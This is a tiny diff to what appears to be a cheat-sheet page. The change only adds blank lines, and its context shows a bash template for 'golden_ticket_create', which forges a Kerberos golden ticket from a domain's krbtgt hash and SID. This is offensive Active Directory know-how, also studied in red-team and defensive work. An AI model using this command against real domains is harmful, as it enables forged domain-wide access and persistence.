@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:24:57.230302+00:00'
 ```bash
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 ```
+
+
